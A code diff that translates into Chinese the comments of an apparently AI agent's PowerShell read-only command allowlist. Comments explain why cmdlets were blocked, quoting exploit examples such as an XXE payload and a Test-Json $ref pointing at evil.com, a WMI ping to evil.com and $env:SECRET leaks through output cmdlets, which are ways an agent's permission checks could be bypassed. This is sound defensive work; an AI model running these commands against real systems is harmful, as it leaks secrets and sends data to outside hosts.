@@ -1,7 +1,7 @@
 /**
- * PowerShell read-only command validation.
+ * PowerShell 只读命令校验。
  *
- * Cmdlets are case-insensitive; all matching is done in lowercase.
+ * Cmdlet 不区分大小写；所有匹配都会先转成小写进行。
  */
 
 import type {
@@ -37,18 +37,18 @@ const DOTNET_READ_ONLY_FLAGS = new Set([
 ])
 
 type CommandConfig = {
-  /** Safe subcommands or flags for this command */
+  /** 此命令的安全子命令或 flag */
   safeFlags?: string[]
   /**
-   * When true, all flags are allowed regardless of safeFlags.
-   * Use for commands whose entire flag surface is read-only (e.g., hostname).
-   * Without this, an empty/missing safeFlags rejects all flags (positional
-   * args only).
+   * 为 true 时，无论 safeFlags 如何都允许所有 flag。
+   * 适用于整个 flag 面都属于只读的命令（例如 hostname）。
+   * 否则，空的或缺失的 safeFlags 会拒绝所有 flag（只剩位置参数
+   * 可用）。
    */
   allowAllFlags?: boolean
-  /** Regex constraint on the original command */
+  /** 原始命令上的正则约束 */
   regex?: RegExp
-  /** Additional validation callback - returns true if command is dangerous */
+  /** 附加校验回调，命令危险时返回 true */
   additionalCommandIsDangerousCallback?: (
     command: string,
     element?: ParsedCommandElement,
@@ -56,22 +56,23 @@ type CommandConfig = {
 }
 
 /**
- * Shared callback for cmdlets that print or coerce their args to stdout/
- * stderr. `Write-Output $env:SECRET` prints it directly; `Start-Sleep
- * $env:SECRET` leaks via type-coerce error ("Cannot convert value 'sk-...'
- * to System.Double"). Bash's echo regex WHITELISTS safe chars per token.
+ * 供会把参数打印到 stdout/stderr，或把参数强制转换后暴露出来的
+ * cmdlet 共享的回调。`Write-Output $env:SECRET` 会直接打印；
+ * `Start-Sleep $env:SECRET` 会通过类型转换报错泄漏
+ * （"Cannot convert value 'sk-...' to System.Double"）。Bash 的 echo
+ * 正则会按 token 白名单限制安全字符。
  *
- * Two checks:
- * 1. elementTypes whitelist — StringConstant (literals) + Parameter (flag
- *    names). Rejects Variable, Other (HashtableAst/ConvertExpressionAst/
- *    BinaryExpressionAst all map to Other), ScriptBlock, SubExpression,
- *    ExpandableString. Same pattern as SAFE_PATH_ELEMENT_TYPES.
- * 2. Colon-bound parameter value — `-InputObject:$env:SECRET` creates a
- *    SINGLE CommandParameterAst; the VariableExpressionAst is its .Argument
- *    child, not a separate CommandElement. elementTypes = [..., 'Parameter'],
- *    whitelist passes. Query children[] for the .Argument's mapped type;
- *    anything other than StringConstant (Variable, ParenExpression wrapping
- *    arbitrary pipelines, Hashtable, etc.) is a leak vector.
+ * 两层检查：
+ * 1. elementTypes 白名单：StringConstant（字面量）+ Parameter（flag
+ *    名）。拒绝 Variable、Other（HashtableAst/ConvertExpressionAst/
+ *    BinaryExpressionAst 都映射成 Other）、ScriptBlock、SubExpression、
+ *    ExpandableString。模式与 SAFE_PATH_ELEMENT_TYPES 一致。
+ * 2. 冒号绑定的参数值：`-InputObject:$env:SECRET` 只会创建一个
+ *    CommandParameterAst；VariableExpressionAst 是它的 .Argument 子节点，
+ *    不是单独的 CommandElement。此时 elementTypes = [..., 'Parameter']，
+ *    白名单会放行。所以还要查 children[] 里 .Argument 映射出的类型；
+ *    只要不是 StringConstant（如 Variable、包着任意 pipeline 的
+ *    ParenExpression、Hashtable 等），都属于泄漏向量。
  */
 export function argLeaksValue(
   _cmd: string,
@@ -82,12 +83,12 @@ export function argLeaksValue(
   const children = element?.children
   for (let i = 0; i < argTypes.length; i++) {
     if (argTypes[i] !== 'StringConstant' && argTypes[i] !== 'Parameter') {
-      // ArrayLiteralAst (`Select-Object Name, Id`) maps to 'Other' — the
-      // parse script only populates children for CommandParameterAst.Argument,
-      // so we can't inspect elements. Fall back to string-archaeology on the
-      // extent text: Hashtable has `@{`, ParenExpr has `(`, variables have
-      // `$`, type literals have `[`, scriptblocks have `{`. A comma-list of
-      // bare identifiers has none. `Name, $x` still rejects on `$`.
+      // ArrayLiteralAst（`Select-Object Name, Id`）会映射成 'Other'。
+      // 解析脚本只会给 CommandParameterAst.Argument 填 children，
+      // 所以这里无法检查元素本身。回退到对 extent 文本做“字符串考古”：
+      // Hashtable 有 `@{`，ParenExpr 有 `(`，变量有 `$`，类型字面量有 `[`，
+      // scriptblock 有 `{`。纯裸标识符的逗号列表不会命中这些模式。
+      // `Name, $x` 仍会因为 `$` 被拒绝。
       if (!/[$(@{[]/.test(args[i] ?? '')) {
         continue
       }
@@ -100,9 +101,9 @@ export function argLeaksValue(
           return true
         }
       } else {
-        // Fallback: string-archaeology on arg text (pre-children parsers).
-        // Reject `$` (variable), `(` (ParenExpressionAst), `@` (hash/array
-        // sub), `{` (scriptblock), `[` (type literal/static method).
+        // 回退：对参数文本做“字符串考古”（兼容没有 children 的旧解析器）。
+        // 拒绝 `$`（变量）、`(`（ParenExpressionAst）、`@`（hash/array
+        // 子表达式）、`{`（scriptblock）、`[`（类型字面量/静态方法）。
         const arg = args[i] ?? ''
         const colonIdx = arg.indexOf(':')
         if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
@@ -115,22 +116,22 @@ export function argLeaksValue(
 }
 
 /**
- * Allowlist of PowerShell cmdlets that are considered read-only.
- * Each cmdlet maps to its configuration including safe flags.
+ * 被视为只读的 PowerShell cmdlet 白名单。
+ * 每个 cmdlet 都映射到一份配置，其中包含安全 flag。
  *
- * Note: PowerShell cmdlets are case-insensitive, so we store keys in lowercase
- * and normalize input for matching.
+ * 注意：PowerShell cmdlet 不区分大小写，所以这里统一用小写 key，
+ * 并在匹配前对输入做归一化。
  *
- * Uses Object.create(null) to prevent prototype-chain pollution — attacker-
- * controlled command names like 'constructor' or '__proto__' must return
- * undefined, not inherited Object.prototype properties. Same defense as
- * COMMON_ALIASES in parser.ts.
+ * 使用 Object.create(null) 以防止原型链污染。攻击者可控的命令名，
+ * 如 'constructor' 或 '__proto__'，必须返回 undefined，而不是继承到
+ * Object.prototype 上的属性。这里与 parser.ts 中的 COMMON_ALIASES
+ * 采用同样的防护。
  */
 export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
   Object.create(null) as Record<string, CommandConfig>,
   {
     // =========================================================================
-    // PowerShell Cmdlets - Filesystem (read-only)
+    // PowerShell Cmdlet - 文件系统（只读）
     // =========================================================================
     'get-childitem': {
       safeFlags: [
@@ -201,7 +202,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Navigation (read-only, just changes working directory)
+    // PowerShell Cmdlet - 导航（只读，只改变工作目录）
     // =========================================================================
     'set-location': {
       safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
@@ -214,7 +215,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Text searching/filtering (read-only)
+    // PowerShell Cmdlet - 文本搜索/过滤（只读）
     // =========================================================================
     'select-string': {
       safeFlags: [
@@ -236,7 +237,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Data conversion (pure transforms, no side effects)
+    // PowerShell Cmdlet - 数据转换（纯转换，无副作用）
     // =========================================================================
     'convertto-json': {
       safeFlags: [
@@ -318,12 +319,12 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         '-PassThru',
       ],
     },
-    // SECURITY: select-xml REMOVED. XML external entity (XXE) resolution can
-    // trigger network requests via DOCTYPE SYSTEM/PUBLIC references in -Content
-    // or -Xml. `Select-Xml -Content '<!DOCTYPE x [<!ENTITY e SYSTEM
-    // "http://evil.com/x">]><x>&e;</x>' -XPath '/'` sends a GET request.
-    // PowerShell's XmlDocument.LoadXml doesn't disable entity resolution by
-    // default. Removal forces prompt.
+    // SECURITY：已移除 select-xml。XML 外部实体（XXE）解析可通过 -Content
+    // 或 -Xml 中的 DOCTYPE SYSTEM/PUBLIC 引用触发网络请求。
+    // `Select-Xml -Content '<!DOCTYPE x [<!ENTITY e SYSTEM
+    // "http://evil.com/x">]><x>&e;</x>' -XPath '/'` 会发出 GET 请求。
+    // PowerShell 的 XmlDocument.LoadXml 默认不会禁用实体解析，
+    // 因此这里只能移除并强制走 prompt。
     'join-string': {
       safeFlags: [
         '-InputObject',
@@ -336,11 +337,11 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         '-FormatString',
       ],
     },
-    // SECURITY: Test-Json REMOVED. -Schema (positional 1) accepts JSON Schema
-    // with $ref pointing to external URLs — Test-Json fetches them (network
-    // request). safeFlags only validates EXPLICIT flags, not positional binding:
-    // `Test-Json '{}' '{"$ref":"http://evil.com"}'` → position 1 binds to
-    // -Schema → safeFlags check sees two non-flag args, skips both → auto-allow.
+    // SECURITY：已移除 Test-Json。-Schema（位置参数 1）可接受带有指向外部
+    // URL 的 $ref 的 JSON Schema，而 Test-Json 会去拉取它们（网络请求）。
+    // safeFlags 只校验显式 flag，不校验位置绑定：
+    // `Test-Json '{}' '{"$ref":"http://evil.com"}'` → 第 1 个位置参数绑定到
+    // -Schema → safeFlags 检查看到两个非 flag 参数并全部跳过 → 自动放行。
     'get-random': {
       safeFlags: [
         '-InputObject',
@@ -353,23 +354,23 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Path utilities (read-only)
+    // PowerShell Cmdlet - 路径工具（只读）
     // =========================================================================
-    // convert-path's entire purpose is to resolve filesystem paths. It is now
-    // in CMDLET_PATH_CONFIG for proper path validation, so safeFlags here only
-    // list the path parameters (which CMDLET_PATH_CONFIG will validate).
+    // convert-path 的全部用途就是解析文件系统路径。它现在已经放进
+    // CMDLET_PATH_CONFIG 做正确的路径校验，所以这里的 safeFlags 只列出
+    // 路径参数（由 CMDLET_PATH_CONFIG 负责校验）。
     'convert-path': {
       safeFlags: ['-Path', '-LiteralPath'],
     },
     'join-path': {
-      // -Resolve removed: it touches the filesystem to verify the joined path
-      // exists, but the path was not validated against allowed directories.
-      // Without -Resolve, Join-Path is pure string manipulation.
+      // 已移除 -Resolve：它会触碰文件系统来确认拼接后的路径是否存在，
+      // 但该路径并未按允许目录做校验。不带 -Resolve 时，Join-Path 只是
+      // 纯字符串处理。
       safeFlags: ['-Path', '-ChildPath', '-AdditionalChildPath'],
     },
     'split-path': {
-      // -Resolve removed: same rationale as join-path. Without -Resolve,
-      // Split-Path is pure string manipulation.
+      // 已移除 -Resolve：理由与 join-path 相同。不带 -Resolve 时，
+      // Split-Path 只是纯字符串处理。
       safeFlags: [
         '-Path',
         '-LiteralPath',
@@ -384,11 +385,11 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Additional system info (read-only)
+    // PowerShell Cmdlet - 额外系统信息（只读）
     // =========================================================================
-    // NOTE: Get-Clipboard is intentionally NOT included - it can expose sensitive
-    // data like passwords or API keys that the user may have copied. Bash also
-    // does not auto-allow clipboard commands (pbpaste, xclip, etc.).
+    // 注意：这里有意不包含 Get-Clipboard。它可能暴露用户复制过的敏感
+    // 数据，如密码或 API key。Bash 侧也不会自动放行剪贴板命令
+    // （pbpaste、xclip 等）。
     'get-hotfix': {
       safeFlags: ['-Id', '-Description'],
     },
@@ -400,7 +401,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Process/System info
+    // PowerShell Cmdlet - 进程/系统信息
     // =========================================================================
     'get-process': {
       safeFlags: [
@@ -436,13 +437,13 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     'get-psdrive': {
       safeFlags: ['-Name', '-PSProvider', '-Scope'],
     },
-    // SECURITY: Get-Command REMOVED from allowlist. -Name (positional 0,
-    // ValueFromPipeline=true) triggers module autoload which runs .psm1 init
-    // code. Chain attack: pre-plant module in PSModulePath, trigger autoload.
-    // Previously tried removing -Name/-Module from safeFlags + rejecting
-    // positional StringConstant, but pipeline input (`'EvilCmdlet' | Get-Command`)
-    // bypasses the callback entirely since args are empty. Removal forces
-    // prompt. Users who need it can add explicit allow rule.
+    // SECURITY：Get-Command 已从 allowlist 中移除。-Name（位置参数 0，
+    // ValueFromPipeline=true）会触发模块自动加载，从而执行 .psm1 初始化
+    // 代码。链式攻击方式是先在 PSModulePath 中预埋模块，再触发 autoload。
+    // 之前尝试过从 safeFlags 里去掉 -Name/-Module 并拒绝位置
+    // StringConstant，但管道输入（`'EvilCmdlet' | Get-Command`）由于 args
+    // 为空会完全绕过回调。因此只能移除并强制走 prompt。需要的话用户可
+    // 手动加显式 allow 规则。
     'get-module': {
       safeFlags: [
         '-Name',
@@ -452,9 +453,9 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         '-PSEdition',
       ],
     },
-    // SECURITY: Get-Help REMOVED from allowlist. Same module autoload hazard
-    // as Get-Command (-Name has ValueFromPipeline=true, pipeline input bypasses
-    // arg-level callback). Removal forces prompt.
+    // SECURITY：Get-Help 已从 allowlist 中移除。它与 Get-Command 有相同的
+    // 模块自动加载风险（-Name 带 ValueFromPipeline=true，管道输入会绕过
+    // 参数级回调），因此也必须强制走 prompt。
     'get-alias': {
       safeFlags: ['-Name', '-Definition', '-Scope', '-Exclude'],
     },
@@ -475,18 +476,18 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Output & misc (no side effects)
+    // PowerShell Cmdlet - 输出与杂项（无副作用）
     // =========================================================================
-    // Bash parity: `echo` is auto-allowed via custom regex (BashTool
-    // readOnlyValidation.ts:~1517). That regex WHITELISTS safe chars per arg.
-    // See argLeaksValue above for the three attack shapes it blocks.
+    // 与 Bash 保持一致：`echo` 会通过自定义正则自动放行（BashTool
+    // readOnlyValidation.ts:~1517）。该正则会按参数对白名单安全字符做限制。
+    // 上面的 argLeaksValue 已解释它要拦住的三类攻击形态。
     'write-output': {
       safeFlags: ['-InputObject', '-NoEnumerate'],
       additionalCommandIsDangerousCallback: argLeaksValue,
     },
-    // Write-Host bypasses the pipeline (Information stream, PS5+), so it's
-    // strictly less capable than Write-Output — but the same
-    // `Write-Host $env:SECRET` leak-via-display applies.
+    // Write-Host 会绕过 pipeline（Information stream，PS5+），因此能力上
+    // 严格弱于 Write-Output，但同样存在
+    // `Write-Host $env:SECRET` 这种通过显示泄漏的风险。
     'write-host': {
       safeFlags: [
         '-Object',
@@ -497,27 +498,28 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
       ],
       additionalCommandIsDangerousCallback: argLeaksValue,
     },
-    // Bash parity: `sleep` is in READONLY_COMMANDS (BashTool
-    // readOnlyValidation.ts:~1146). Zero side effects at runtime — but
-    // `Start-Sleep $env:SECRET` leaks via type-coerce error. Same guard.
+    // 与 Bash 保持一致：`sleep` 在 READONLY_COMMANDS 中（BashTool
+    // readOnlyValidation.ts:~1146）。它在运行时没有副作用，但
+    // `Start-Sleep $env:SECRET` 会通过类型转换报错泄漏，所以要套同样的防护。
     'start-sleep': {
       safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
       additionalCommandIsDangerousCallback: argLeaksValue,
     },
-    // Format-* and Measure-Object moved here from SAFE_OUTPUT_CMDLETS after
-    // security review found all accept calculated-property hashtables (same
-    // exploit as Where-Object — I4 regression). isSafeOutputCommand is a
-    // NAME-ONLY check that filtered them out of the approval loop BEFORE arg
-    // validation. Here, argLeaksValue validates args:
+    // Format-* 和 Measure-Object 在安全审查后从 SAFE_OUTPUT_CMDLETS 挪到
+    // 这里，因为它们都接受 calculated-property hashtable
+    // （与 Where-Object 是同类利用面，也是 I4 回归）。
+    // isSafeOutputCommand 只按名称判断，会在参数校验之前就把它们从审批流程
+    // 中过滤掉。这里改为由 argLeaksValue 校验参数：
     //   | Format-Table               → no args → safe → allow
     //   | Format-Table Name, CPU     → StringConstant positionals → safe → allow
     //   | Format-Table $env:SECRET   → Variable elementType → blocked → passthrough
     //   | Format-Table @{N='x';E={}} → Other (HashtableAst) → blocked → passthrough
     //   | Measure-Object -Property $env:SECRET → same → blocked
-    // allowAllFlags: argLeaksValue validates arg elementTypes (Variable/Hashtable/
-    // ScriptBlock → blocked). Format-* flags themselves (-AutoSize, -GroupBy,
-    // -Wrap, etc.) are display-only. Without allowAllFlags, the empty-safeFlags
-    // default rejects ALL flags — `Format-Table -AutoSize` would over-prompt.
+    // allowAllFlags：argLeaksValue 会校验参数的 elementType（Variable/
+    // Hashtable/ScriptBlock 都会被拦住）。Format-* 自身的 flag
+    // （-AutoSize、-GroupBy、-Wrap 等）只影响显示。如果没有
+    // allowAllFlags，空的 safeFlags 默认会拒绝所有 flag，
+    // `Format-Table -AutoSize` 就会被过度 prompt。
     'format-table': {
       allowAllFlags: true,
       additionalCommandIsDangerousCallback: argLeaksValue,
@@ -538,15 +540,15 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
       allowAllFlags: true,
       additionalCommandIsDangerousCallback: argLeaksValue,
     },
-    // Select-Object/Sort-Object/Group-Object/Where-Object: same calculated-
-    // property hashtable surface as format-* (about_Calculated_Properties).
-    // Removed from SAFE_OUTPUT_CMDLETS but previously missing here, causing
-    // `Get-Process | Select-Object Name` to over-prompt. argLeaksValue handles
-    // them identically: StringConstant property names pass (`Select-Object Name`),
-    // HashtableAst/ScriptBlock/Variable args block (`Select-Object @{N='x';E={...}}`,
-    // `Where-Object { ... }`). allowAllFlags: -First/-Last/-Skip/-Descending/
-    // -Property/-EQ etc. are all selection/ordering flags — harmless on their own;
-    // argLeaksValue catches the dangerous arg *values*.
+    // Select-Object/Sort-Object/Group-Object/Where-Object 与 format-* 一样，
+    // 也有 calculated-property hashtable 这类攻击面（about_Calculated_Properties）。
+    // 它们虽然已从 SAFE_OUTPUT_CMDLETS 移除，但此前这里没补上，导致
+    // `Get-Process | Select-Object Name` 被过度 prompt。argLeaksValue 对这些
+    // 命令做相同处理：StringConstant 属性名可通过（`Select-Object Name`），
+    // HashtableAst/ScriptBlock/Variable 参数会被拦住
+    // （`Select-Object @{N='x';E={...}}`、`Where-Object { ... }`）。
+    // allowAllFlags：-First/-Last/-Skip/-Descending/-Property/-EQ 等都只是
+    // 选择/排序 flag，本身无害；真正危险的是参数值，由 argLeaksValue 兜底。
     'select-object': {
       allowAllFlags: true,
       additionalCommandIsDangerousCallback: argLeaksValue,
@@ -563,11 +565,11 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
       allowAllFlags: true,
       additionalCommandIsDangerousCallback: argLeaksValue,
     },
-    // Out-String/Out-Host moved here from SAFE_OUTPUT_CMDLETS — both accept
-    // -InputObject which leaks the same way Write-Output does.
-    // `Get-Process | Out-String -InputObject $env:SECRET` → secret prints.
-    // allowAllFlags: -Width/-Stream/-Paging/-NoNewline are display flags;
-    // argLeaksValue catches the dangerous -InputObject *value*.
+    // Out-String/Out-Host 也从 SAFE_OUTPUT_CMDLETS 挪到了这里，因为它们都
+    // 支持 -InputObject，泄漏方式与 Write-Output 相同。
+    // `Get-Process | Out-String -InputObject $env:SECRET` 会把 secret 打印出来。
+    // allowAllFlags：-Width/-Stream/-Paging/-NoNewline 都是显示相关 flag；
+    // 危险的 -InputObject 参数值由 argLeaksValue 捕获。
     'out-string': {
       allowAllFlags: true,
       additionalCommandIsDangerousCallback: argLeaksValue,
@@ -578,7 +580,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Network info (read-only)
+    // PowerShell Cmdlet - 网络信息（只读）
     // =========================================================================
     'get-netadapter': {
       safeFlags: [
@@ -608,8 +610,8 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
       ],
     },
     'get-dnsclientcache': {
-      // SECURITY: -CimSession/-ThrottleLimit excluded. -CimSession connects to
-      // a remote host (network request). Previously empty config = all flags OK.
+      // SECURITY：已排除 -CimSession/-ThrottleLimit。-CimSession 会连接远程
+      // 主机（网络请求）。此前空配置相当于默认所有 flag 都允许。
       safeFlags: ['-Entry', '-Name', '-Type', '-Status', '-Section', '-Data'],
     },
     'get-dnsclient': {
@@ -617,7 +619,7 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     },
 
     // =========================================================================
-    // PowerShell Cmdlets - Event log (read-only)
+    // PowerShell Cmdlet - 事件日志（只读）
     // =========================================================================
     'get-eventlog': {
       safeFlags: [
@@ -658,15 +660,16 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // =========================================================================
     // PowerShell Cmdlets - WMI/CIM
     // =========================================================================
-    // SECURITY: Get-WmiObject and Get-CimInstance REMOVED. They actively
-    // trigger network requests via classes like Win32_PingStatus (sends ICMP
-    // when enumerated) and can query remote computers via -ComputerName/
-    // CimSession. -Class/-ClassName/-Filter/-Query accept arbitrary WMI
-    // classes/WQL that we cannot statically validate.
+    // SECURITY：Get-WmiObject 和 Get-CimInstance 已移除。它们会主动通过
+    // Win32_PingStatus 这类 class 触发网络请求（枚举时会发 ICMP），还可
+    // 通过 -ComputerName/CimSession 查询远程机器。
+    // -Class/-ClassName/-Filter/-Query 接受任意 WMI class/WQL，
+    // 无法静态校验。
     //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
     //   → sends ICMP to evil.com (DNS leak + potential NTLM auth leak).
-    // WMI can also auto-load provider DLLs (init code). Removal forces prompt.
-    // get-cimclass stays — only lists class metadata, no instance enumeration.
+    // WMI 还可能自动加载 provider DLL（初始化代码）。因此这里只能移除并
+    // 强制 prompt。get-cimclass 仍然保留，因为它只列出 class 元数据，
+    // 不会枚举实例。
     'get-cimclass': {
       safeFlags: [
         '-ClassName',
@@ -680,27 +683,31 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // =========================================================================
     // Git - uses shared external command validation with per-flag checking
     // =========================================================================
+    // Git - 使用共享的外部命令校验，并按 flag 单独检查
     git: {},
 
     // =========================================================================
     // GitHub CLI (gh) - uses shared external command validation
     // =========================================================================
+    // GitHub CLI（gh）- 使用共享的外部命令校验
     gh: {},
 
     // =========================================================================
     // Docker - uses shared external command validation
     // =========================================================================
+    // Docker - 使用共享的外部命令校验
     docker: {},
 
     // =========================================================================
     // Windows-specific system commands
     // =========================================================================
+    // Windows 特有系统命令
     ipconfig: {
-      // SECURITY: On macOS, `ipconfig set <iface> <mode>` configures network
-      // (writes system config). safeFlags only validates FLAGS, positional args
-      // are SKIPPED. Reject any positional argument — only bare `ipconfig` or
-      // `ipconfig /all` (read-only display) allowed. Windows ipconfig only uses
-      // /flags (display), macOS ipconfig uses subcommands (get/set/waitall).
+      // SECURITY：在 macOS 上，`ipconfig set <iface> <mode>` 会配置网络
+      //（写系统配置）。safeFlags 只校验 flag，位置参数会被跳过。
+      // 因此要拒绝任何位置参数，只允许裸 `ipconfig` 或 `ipconfig /all`
+      // 这类只读展示形式。Windows 的 ipconfig 只用 /flags，macOS 的
+      // ipconfig 则使用子命令（get/set/waitall）。
       safeFlags: ['/all', '/displaydns', '/allcompartments'],
       additionalCommandIsDangerousCallback: (
         _cmd: string,
@@ -734,23 +741,23 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     tasklist: {
       safeFlags: ['/M', '/SVC', '/V', '/FI', '/FO', '/NH'],
     },
-    // where.exe: Windows PATH locator, bash `which` equivalent. Reaches here via
-    // SAFE_EXTERNAL_EXES bypass at the nameType gate in isAllowlistedCommand.
-    // All flags are read-only (/R /F /T /Q), matching bash's treatment of `which`
-    // in BashTool READONLY_COMMANDS.
+    // where.exe：Windows 的 PATH 定位器，相当于 bash 的 `which`。
+    // 它通过 isAllowlistedCommand 中 nameType gate 上的 SAFE_EXTERNAL_EXES
+    // 绕过逻辑进入这里。其所有 flag（/R /F /T /Q）都是只读的，
+    // 与 BashTool READONLY_COMMANDS 对 `which` 的处理一致。
     'where.exe': {
       allowAllFlags: true,
     },
     hostname: {
-      // SECURITY: `hostname NAME` on Linux/macOS SETS the hostname (writes to
-      // system config). `hostname -F FILE` / `--file=FILE` also sets from file.
-      // Only allow bare `hostname` and known read-only flags.
+      // SECURITY：在 Linux/macOS 上，`hostname NAME` 会设置主机名
+      //（写系统配置）。`hostname -F FILE` / `--file=FILE` 也会从文件设置。
+      // 因此只允许裸 `hostname` 和已知只读 flag。
       safeFlags: ['-a', '-d', '-f', '-i', '-I', '-s', '-y', '-A'],
       additionalCommandIsDangerousCallback: (
         _cmd: string,
         element?: ParsedCommandElement,
       ) => {
-        // Reject any positional (non-flag) argument — sets hostname.
+        // 拒绝任何位置参数（非 flag），因为那会设置 hostname。
         return (element?.args ?? []).some(a => !a.startsWith('-'))
       },
     },
@@ -778,11 +785,12 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         _cmd: string,
         element?: ParsedCommandElement,
       ) => {
-        // SECURITY: route.exe syntax is `route [-f] [-p] [-4|-6] VERB [args...]`.
-        // The first non-flag positional is the verb. `route add 10.0.0.0 mask
-        // 255.0.0.0 192.168.1.1 print` adds a route (print is a trailing display
-        // modifier). The old check used args.some('print') which matched 'print'
-        // anywhere — position-insensitive.
+        // SECURITY：route.exe 的语法是
+        // `route [-f] [-p] [-4|-6] VERB [args...]`。
+        // 第一个非 flag 的位置参数才是 verb。`route add 10.0.0.0 mask
+        // 255.0.0.0 192.168.1.1 print` 实际是在添加路由，print 只是尾部
+        // 的显示修饰符。旧逻辑用 args.some('print')，会在任意位置命中
+        // 'print'，位置不敏感。
         if (!element) {
           return true
         }
@@ -790,14 +798,14 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         return verb?.toLowerCase() !== 'print'
       },
     },
-    // netsh: intentionally NOT allowlisted. Three rounds of denylist gaps in PR
-    // #22060 (verb position → dash flags → slash flags → more verbs) proved
-    // the grammar is too complex to allowlist safely: 3-deep context nesting
-    // (`netsh interface ipv4 show addresses`), dual-prefix flags (-f / /f),
-    // script execution via -f and `exec`, remote RPC via -r, offline-mode
-    // commit, wlan connect/disconnect, etc. Each denylist expansion revealed
-    // another gap. `route` stays — `route print` is the only read-only form,
-    // simple single-verb-position grammar.
+    // netsh：这里有意不进 allowlist。PR #22060 中做过三轮 denylist 补洞
+    //（verb 位置 → dash flag → slash flag → 更多 verb），证明它的语法过于
+    // 复杂，无法安全 allowlist：有 3 层上下文嵌套
+    // （`netsh interface ipv4 show addresses`）、双前缀 flag（-f / /f）、
+    // 可通过 -f 和 `exec` 执行脚本、通过 -r 走远程 RPC、离线模式提交、
+    // wlan connect/disconnect 等。每扩一轮 denylist 都会露出新的缺口。
+    // `route` 还能保留，是因为 `route print` 是唯一只读形式，语法也只是
+    // 简单的单 verb 位置模型。
     getmac: {
       safeFlags: ['/FO', '/NH', '/V'],
     },
@@ -805,9 +813,10 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // =========================================================================
     // Cross-platform CLI tools
     // =========================================================================
-    // File inspection
-    // SECURITY: file -C compiles a magic database and WRITES to disk. Only
-    // allow introspection flags; reject -C / --compile / -m / --magic-file.
+    // 跨平台 CLI 工具
+    // 文件检查
+    // SECURITY：`file -C` 会编译 magic 数据库并写磁盘。这里只允许做探测的
+    // flag，拒绝 -C / --compile / -m / --magic-file。
     file: {
       safeFlags: [
         '-b',
@@ -860,8 +869,8 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
         '/M',
         '/O',
         '/P',
-        // Flag matching strips ':' before comparison (e.g., /C:pattern → /C),
-        // so these entries must NOT include the trailing colon.
+        // flag 匹配时会先去掉 ':' 再比较（例如 /C:pattern → /C），
+        // 所以这里的条目不能带尾部冒号。
         '/C',
         '/G',
         '/D',
@@ -872,12 +881,13 @@ export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
     // =========================================================================
     // Package managers - uses shared external command validation
     // =========================================================================
+    // 包管理器 - 使用共享的外部命令校验
     dotnet: {},
 
-    // SECURITY: man and help direct entries REMOVED. They aliased Get-Help
-    // (also removed — see above). Without these entries, lookupAllowlist
-    // resolves via COMMON_ALIASES to 'get-help' which is not in allowlist →
-    // prompt. Same module-autoload hazard as Get-Help.
+    // SECURITY：已移除 man 和 help 的直接条目。它们都别名到 Get-Help
+    //（上面也已移除）。没有这些条目后，lookupAllowlist 会通过
+    // COMMON_ALIASES 解析成不在 allowlist 里的 'get-help'，从而触发 prompt。
+    // 风险与 Get-Help 的模块自动加载相同。
   },
 )
 
